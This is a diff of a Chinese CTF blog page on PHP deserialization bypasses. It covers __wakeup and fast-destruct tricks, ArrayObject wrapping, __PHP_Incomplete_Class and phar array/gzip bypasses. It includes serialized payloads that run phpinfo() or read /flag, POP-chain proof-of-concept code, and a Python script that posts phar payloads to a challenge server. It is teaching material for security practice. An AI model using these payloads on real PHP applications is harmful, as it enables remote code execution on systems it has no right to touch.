 a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cg0"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"num"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cg1"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"string"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cg2"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//修改后的payload</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>如下图成功绕过</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226155630445.png" alt="image-20231226155630445"></p>
+<p><img src="image-20231226155630445.png" alt="image-20231226155630445"></p>
 <h2 id="CTFSHOW卷王杯-easy-unserialize">CTFSHOW卷王杯-easy unserialize</h2>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./HappyYear.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -1087,7 +1092,7 @@ a<span class="token punctuation">:</span><span class="token number">2</span><spa
 <p>也就是说这里的<code>[$this, $func."Me"]</code>参数会被当做一个函数去对待，后面的args则是该函数的参数，那这里意味着我们可以构造出mememe方法。</p>
 <p>接下来在思考如何调用其所在的call方法：需要找一个不存在的属性的地方，那很明显就是<code>$this-&gt;object-&gt;add();</code>此处了，这两个地方相互配合又会去调用addMe方法，接着会触发tostring。</p>
 <p>在该方法下有<code>$this-&gt;object-&gt;string;</code>这里大概率是想要调用third类的get方法，因为string数不可访问的属性。最后就是<code>$var[$name]();</code>这一重要的点了，我们可以在PHP文档中找到如下信息：</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226165227268.png" alt="image-20231226165227268"></p>
+<p><img src="image-20231226165227268.png" alt="image-20231226165227268"></p>
 <p>可以看到如果我们有这样的代码：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$var</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">one</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'MeMeMe'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token comment">//则$var();就会去调用new one对象的mememe方法了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -1105,7 +1110,7 @@ a<span class="token punctuation">:</span><span class="token number">2</span><spa
         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里的if语句如何绕过，我们先了解array_walk函数的用法</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226170924564.png" alt="image-20231226170924564"></p>
+<p><img src="image-20231226170924564.png" alt="image-20231226170924564"></p>
 <p>简单例子如下：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$fruits</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"d"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"lemon"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"orange"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"b"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"banana"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"c"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"apple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -1153,7 +1158,7 @@ a<span class="token punctuation">:</span><span class="token number">2</span><spa
 <p>也就是说其中的$this会去遍历当前对象的每个公共属性，即<code>$year_parm</code>与<code>$object</code>，随后的自定义function函数中fn变量是属性的值，prev变量代表属性的名字。</p>
 <p>即如果传入$a-&gt;year_parm = array(‘Happy_func’);，则array_walk在调用的时候是这样的。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$fn</span><span class="token operator">=</span><span class="token string single-quoted-string">'Happy_func'</span><span class="token operator">&amp;</span><span class="token variable">$prev</span><span class="token operator">=</span><span class="token string single-quoted-string">'year_parm'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226171154550.png" alt="image-20231226171154550"></p>
+<p><img src="image-20231226171154550.png" alt="image-20231226171154550"></p>
 <p>至此我们可以写poc了</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name-definition class-name">one</span> <span class="token punctuation">{</span>
@@ -1216,7 +1221,7 @@ a<span class="token punctuation">:</span><span class="token number">2</span><spa
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>解释一下这里的赋值<code>new third(array("string"=&gt;[new one(),"MeMeMe"]));</code></p>
 <p>因为这里我们调用的是<code>__get</code>方法，而此前我们是这样调用的<code>$this-&gt;object-&gt;string;</code>这里的object为third对象实例，这样在调用get后，get其中的$name变量的值就是string（可以自行测试验证），而之后存在<code>$var = $this-&gt;$name;</code>这一行代码，即<code>$var = $this-&gt;$string;</code>而<code>$string=[new one(),"MeMeMe"]</code>至此变量var成功被赋值为数组</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226181342645.png" alt="image-20231226181342645"></p>
+<p><img src="image-20231226181342645.png" alt="image-20231226181342645"></p>
 <p>就这一个题废了1个小时。。。太菜了</p>
 <h2 id="NSSCTF-prize-p1">NSSCTF prize_p1</h2>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -1271,9 +1276,9 @@ a<span class="token punctuation">:</span><span class="token number">2</span><spa
 <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>但这里值得注意的点是，在phar反序列化的时候，如下图标记处，可以看到这里的Metadata属性引用了我们的$a，这会导致在反序列化的时候，会触发题目的异常而无法调用析构函数，因此需要采用反序列化数组绕过</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226192819934.png" alt="image-20231226192819934"></p>
+<p><img src="image-20231226192819934.png" alt="image-20231226192819934"></p>
 <p>这里对生成的phar文件，用010打开后修改数组索引，之后需要重新计算phar签名</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226193416814.png" alt="image-20231226193416814"></p>
+<p><img src="image-20231226193416814.png" alt="image-20231226193416814"></p>
 <h3 id="数组绕过">数组绕过</h3>
 <p>修改成功，接下来就是绕过正则了，这里采用数组绕过，或者通过gzip等协议压缩也可，这样其内部数据就不是明文了，也就绕过了关键字的过滤。–这里先用数组绕过，脚本如下：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
@@ -1293,7 +1298,7 @@ data2<span class="token operator">=</span><span class="token punctuation">{</spa
 res2<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param2<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">)</span>
 flag<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'NSSCTF\{.*?\}'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>res2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226194445772.png" alt="image-20231226194445772"></p>
+<p><img src="image-20231226194445772.png" alt="image-20231226194445772"></p>
 <p>得到flag</p>
 <h3 id="gzip压缩绕过">gzip压缩绕过</h3>
 <p><code>gzip</code> <code>bzip2</code> <code>tar</code> <code>zip</code> 这四个后缀同样也支持phar://读取</p>
@@ -1402,7 +1407,7 @@ flag <span class="token operator">=</span> re<span class="token punctuation">.</
 <span class="token variable">$keyport</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KeyPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$keyport</span><span class="token operator">-&gt;</span><span class="token property">key</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$keyport</span><span class="token operator">-&gt;</span><span class="token property">wakeup</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>即可成功绕过</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225215159350.png" alt="image-20231225215159350"></p>
+<p><img src="image-20231225215159350.png" alt="image-20231225215159350"></p>
 <h2 id="fast-destruct绕过">fast-destruct绕过</h2>
 <p>引用一下大佬的解释：</p>
 <ul>
@@ -1680,7 +1685,7 @@ a<span class="token punctuation">:</span><span class="token number">2</span><spa
 <span class="token variable">$arr</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token operator">=&gt;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"b"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$ao</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayObject</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ao</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226212027738.png" alt="image-20231226212027738"></p>
+<p><img src="image-20231226212027738.png" alt="image-20231226212027738"></p>
 <p>可以看到是C开头的，既然是C开头的，假如我们遇到了这样的题目</p>
 <h3 id="2023愚人杯-easy-php">2023愚人杯-easy_php</h3>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -1722,7 +1727,7 @@ a<span class="token punctuation">:</span><span class="token number">2</span><spa
 <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">#O:7:"ctfshow":0:{}//做这个payload很明显绕过不了</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里我们可以使用ArrayObject对正常的反序列化进行一次包装，让最后输出的payload以C开头。这里官方文档说：</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226213000757.png" alt="image-20231226213000757"></p>
+<p><img src="image-20231226213000757.png" alt="image-20231226213000757"></p>
 <p>支持参数为数组，也就是说我们可以将待反序列化的字符串，经过该内置类的包装即可。因为ArrayObject，他是C开头的，并且可以绕过O，然后还可以带属性反序列化，符合条件，因此可以构造payload：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
@@ -1738,7 +1743,7 @@ a<span class="token punctuation">:</span><span class="token number">2</span><spa
 
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>值得注意的点是，这里进行url传参的时候需要对变量中的加号进行url编码，否则会被识别为空格而无法正常传参，最后成功命令执行</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226213804768.png" alt="image-20231226213804768"></p>
+<p><img src="image-20231226213804768.png" alt="image-20231226213804768"></p>
 <p>最后这位佬还找到了其他可以进行包装的内置类</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -1750,7 +1755,7 @@ a<span class="token punctuation">:</span><span class="token number">2</span><spa
             <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'::'</span> <span class="token operator">.</span> <span class="token variable">$method</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
     <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226213929105.png" alt="image-20231226213929105"></p>
+<p><img src="image-20231226213929105.png" alt="image-20231226213929105"></p>
 <p>经过所有测试发现可以用的类为：</p>
 <ul>
 <li>ArrayObject::unserialize</li>
@@ -1799,9 +1804,9 @@ object(__PHP_Incomplete_Class)#1 (2) {
 }*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以发现PHP在遇到不存在的类时，会把不存在的类转换成<code>__PHP_Incomplete_Class</code>这种特殊的类，同时将原始的类名<code>A</code>存放在<code>__PHP_Incomplete_Class_Name</code>这个属性中，其余属性存放方式不变。</p>
 <p>而我们在序列化这个对象的时候，serialize遇到<code>__PHP_Incomplete_Class</code>这个特殊类会倒推回来，序列化成<code>__PHP_Incomplete_Class_Name</code>值为类名的类，我们看到的序列化结果不是<code>O:22:"__PHP_Incomplete_Class_Name":2:{xxx}</code>而是<code>O:1:"A":1:{s:1:"a";s:1:"b";}</code>,那么如果我们自己如下构造序列化字符串</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226214956225.png" alt="image-20231226214956225"></p>
+<p><img src="image-20231226214956225.png" alt="image-20231226214956225"></p>
 <p>执行结果如下图</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226215003016.png" alt="image-20231226215003016"></p>
+<p><img src="image-20231226215003016.png" alt="image-20231226215003016"></p>
 <p>可以看到在二次序列化后，由于<code>O:22:"__PHP_Incomplete_Class":1:{s:1:"a";O:7:"classes":0:{}}</code>中<code>__PHP_Incomplete_Class_Name</code>为空，找不到应该绑定的类，其属性就被丢弃了</p>
 <h3 id="强网杯2021-WhereIsUWebShell">强网杯2021 WhereIsUWebShell</h3>
 <p>这里网上似乎找不到靶场了，只能跟着过一遍</p>
@@ -1934,7 +1939,7 @@ object(__PHP_Incomplete_Class)#1 (2) {
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"__PHP_Incomplete_Class"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"bcx"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"myclass"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"qwb"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这样的话在第一次反序列化的时候，他将myclass当做一个类，但当前文件没有该类，于是自动调用myclass.php文件，那么Hello类便被将在到当前文件了，接着后面反序列化Hello类的时候便会被正常解析不会报错。</p>
 <p>但在后续序列化的对myclass关键词的检验中，由于我们的<code>__PHP_Incomplete_Class_Name</code>不存在，因此<code>__PHP_Incomplete_Class</code>识别不了后面的<code>{s:3:"bcx";O:7:"myclass":0:{}}</code>于是这一段代码便被删除。</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231227191805029.png" alt="image-20231227191805029"></p>
+<p><img src="image-20231227191805029.png" alt="image-20231227191805029"></p>
 <p>最后我们也可以成功绕过了，对于上述题目我们也可以用刚刚学到的fast-destruct来绕过，即</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#修改序列化数字元素个数</span>
 a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"myclass"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"qwb"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
@@ -2056,7 +2061,7 @@ a<span class="token punctuation">:</span><span class="token number">1</span><spa
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -2064,7 +2069,7 @@ a<span class="token punctuation">:</span><span class="token number">1</span><spa
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -2344,12 +2349,12 @@ a<span class="token punctuation">:</span><span class="token number">1</span><spa
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -2494,6 +2499,8 @@ a<span class="token punctuation">:</span><span class="token number">1</span><spa
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -2521,8 +2528,8 @@ a<span class="token punctuation">:</span><span class="token number">1</span><spa
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -2605,8 +2612,6 @@ a<span class="token punctuation">:</span><span class="token number">1</span><spa
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -2626,24 +2631,28 @@ a<span class="token punctuation">:</span><span class="token number">1</span><spa
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -2855,8 +2864,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
